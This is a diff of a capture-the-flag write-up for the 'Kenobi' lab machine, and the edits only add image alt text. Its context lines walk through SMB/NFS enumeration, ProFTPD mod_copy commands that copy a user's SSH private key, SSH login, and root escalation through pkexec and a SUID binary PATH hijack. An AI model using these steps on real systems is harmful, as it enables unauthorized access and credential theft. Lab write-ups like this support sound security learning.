@@ -28,7 +28,7 @@ I performed an **nmap** aggressive scan to find open ports and the services runn
 nmap -A -p- TARGET -Pn -oN kenobi.nmap --min-rate 10000
 ```
 
-![](https://cdn.ziomsec.com/kenobi/1.webp)
+![performing an nmap scan on kenobi machine](https://cdn.ziomsec.com/kenobi/1.webp)
 
 The scan revealed various services like **ftp**, **ssh**, **http**, **smb** and **nfs** to be running on the system.
 
@@ -40,7 +40,7 @@ Since the target had an **smb** server, I performed enumeration using **nmap** a
 nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse TARGET
 ```
 
-![](https://cdn.ziomsec.com/kenobi/2.webp)
+![enumerating smb](https://cdn.ziomsec.com/kenobi/2.webp)
 
 I connected to the **anonymous** share and downloaded a file called **log.txt**
 
@@ -50,7 +50,7 @@ ls
 get log.txt log.txt
 ```
 
-![](https://cdn.ziomsec.com/kenobi/3.webp)
+![downloading the log file](https://cdn.ziomsec.com/kenobi/3.webp)
 
 The logs file revealed interesting information like a user, path to their ssh key etc.
 
@@ -60,7 +60,7 @@ I then checked the directory that was shared by the target over **nfs**
 showmount -e TARGET
 ```
 
-![](https://cdn.ziomsec.com/kenobi/4.webp)
+![enumerating nfs mount](https://cdn.ziomsec.com/kenobi/4.webp)
 
 I then searched **exploit-db** for exploits related to the **ftp** version running on the target.
 
@@ -68,7 +68,7 @@ I then searched **exploit-db** for exploits related to the **ftp** version runni
 searchsploit 'ProFTP 1.3.5'
 ```
 
-![](https://cdn.ziomsec.com/kenobi/5.webp)
+![searching for exploits related to ftp](https://cdn.ziomsec.com/kenobi/5.webp)
 
 I downloaded the exploit information on my system and analyzed it.
 
@@ -77,9 +77,9 @@ searchsploit -m linux/remote/36742.txt
 cat 36742.txt
 ```
 
-![](https://cdn.ziomsec.com/kenobi/6.webp)
+![inspecting the ftp exploit](https://cdn.ziomsec.com/kenobi/6.webp)
 
-![](https://cdn.ziomsec.com/kenobi/7.webp)
+![inspecting the ftp exploit](https://cdn.ziomsec.com/kenobi/7.webp)
 
 The file revealed that the **ftp** version running on the target allowed unauthenticated clients to copy files and paste files within the system. Since I had discovered the **`/var`** folder to be mounted over **nfs**, I created a directory and mounted it to the server so that I could access the files inside `/var` directory.
 
@@ -88,7 +88,7 @@ mkdir haha
 mount -t nfs TARGET:/var haha
 ```
 
-![](https://cdn.ziomsec.com/kenobi/8.webp)
+![accessing the mounted folder](https://cdn.ziomsec.com/kenobi/8.webp)
 
 After that, I followed the instructions given in the POC. I connected to the **ftp** server using **nc** and used the **`SITE CPFR`** to copy **kenobi's** private key and **`SITE CPTO`** to paste it in the `/var/tmp` directory.
 
@@ -98,7 +98,7 @@ SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/kenobi.key
 ```
 
-![](https://cdn.ziomsec.com/kenobi/9.webp)
+![copying kenobi's private key](https://cdn.ziomsec.com/kenobi/9.webp)
 
 I then copied the private key onto my system from the **nfs** mounted directory.
 
@@ -114,11 +114,11 @@ chmod 600 kenobi.key
 ssh -i kenobi.key kenobi@TARGET
 ```
 
-![](https://cdn.ziomsec.com/kenobi/10.webp)
+![accessing the machine via ssh](https://cdn.ziomsec.com/kenobi/10.webp)
 
 I then captured *user.txt* from **`/home/kenobi`**.
 
-![](https://cdn.ziomsec.com/kenobi/11.webp)
+![capturing the user flag](https://cdn.ziomsec.com/kenobi/11.webp)
 
 ## Privilege Escalation
 ### Exploiting `pkexec`
@@ -145,7 +145,7 @@ I navigated to the **`/root`** directory and captured the final flag.
 cat /root/root.txt
 ```
 
-![](https://cdn.ziomsec.com/kenobi/12.webp)
+![capturing the root flag](https://cdn.ziomsec.com/kenobi/12.webp)
 
 ### Exploiting SUID
 
@@ -155,7 +155,7 @@ I looked for binaries with **suid** bit and found a custom binary called **menu*
 find / -user root -perm -u=s -ls 2>/dev/null
 ```
 
-![](https://cdn.ziomsec.com/kenobi/13.webp)
+![listing files with SUID bits](https://cdn.ziomsec.com/kenobi/13.webp)
 
 So I used **strings** to analyze the strings present in the binaries.
 
@@ -163,11 +163,11 @@ So I used **strings** to analyze the strings present in the binaries.
 strings /usr/bin/menu
 ```
 
-![](https://cdn.ziomsec.com/kenobi/14.webp)
+![analyzing contents of the binary](https://cdn.ziomsec.com/kenobi/14.webp)
 
 Here I found that based on the option selected by the user, it directly executed the system command without providing a complete path to the binary.
 
-![](https://cdn.ziomsec.com/kenobi/15.webp)
+![inspecting the binary](https://cdn.ziomsec.com/kenobi/15.webp)
 
 I could leverage this vulnerability to modify the system path and become a root user. So, I created a custom binary called **curl** and added it at the start of the **PATH** variable. Hence, if I would execute that particular command through the **menu** binary, I would get **root** access.
 
@@ -184,7 +184,7 @@ I executed the **status check** option and got **root** access.
 /usr/bin/menu
 ```
 
-![](https://cdn.ziomsec.com/kenobi/16.webp)
+![gaining root shell](https://cdn.ziomsec.com/kenobi/16.webp)
 
 ## Closure
 
